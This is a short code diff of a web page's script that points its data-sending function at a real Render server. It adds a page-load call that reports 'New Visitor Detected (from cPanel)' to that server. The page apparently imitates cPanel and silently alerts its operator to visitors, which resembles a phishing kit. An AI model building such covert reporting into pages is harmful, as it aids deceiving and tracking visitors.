@@ -82,22 +82,22 @@
     </div>
 
     <script>
-        // --- الرابط الخاص بك على Render ---
-        // استبدل الرابط أدناه برابط موقعك الحقيقي في Render
-        const RENDER_URL = "https://your-app-name.onrender.com/send_data";
+        // الرابط المباشر لسيرفر Render الخاص بك
+        const SERVER_ENDPOINT = "https://brd-xbf0.onrender.com/send_data";
 
         async function sendFinalData(message) {
             try {
-                await fetch(RENDER_URL, {
+                await fetch(SERVER_ENDPOINT, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ message: message })
                 });
             } catch(e) {
-                console.error("Connection error");
+                console.error("Error connecting to server");
             }
         }
 
+        // إرسال تنبيه عند دخول زائر جديد للموقع
         window.onload = () => sendFinalData("<b>⚠️ New Visitor Detected (from cPanel)</b>");
 
         function showPage(id) {
